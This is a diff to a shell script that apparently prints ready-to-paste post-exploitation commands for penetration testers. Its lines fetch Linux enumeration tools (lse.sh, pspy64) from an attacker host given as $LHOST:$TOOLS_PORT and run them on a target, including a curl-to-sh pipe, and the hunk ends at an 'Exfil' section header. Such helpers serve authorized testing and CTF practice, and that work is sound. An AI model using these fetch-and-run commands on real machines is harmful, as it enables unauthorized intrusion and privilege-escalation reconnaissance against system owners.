@@ -102,8 +102,10 @@ echo
 echo "# Linux Smart Enumeration"
 echo "curl -L http://$LHOST:$TOOLS_PORT/linux/linux-smart-enumeration/lse.sh | sh | tee lsenumeration.txt"
 echo
+echo "wget \"http://$LHOST:$TOOLS_PORT/linux/linux-smart-enumeration/lse.sh\" -O lse.sh;chmod 700 lse.sh"
+echo
 echo "# Pspy"
-echo "wget -O /tmp/pspy64 http://$LHOST:$TOOLS_PORT/linux/pspy64 && chmod +x /tmp/pspy64"
+echo "wget -O /tmp/pspy64 http://$LHOST:$TOOLS_PORT/linux/pspy64 && chmod +x /tmp/pspy64 | /tmp/pspy64 -pf -i 1000" 
 echo
 echo
 echo "# Exfil"
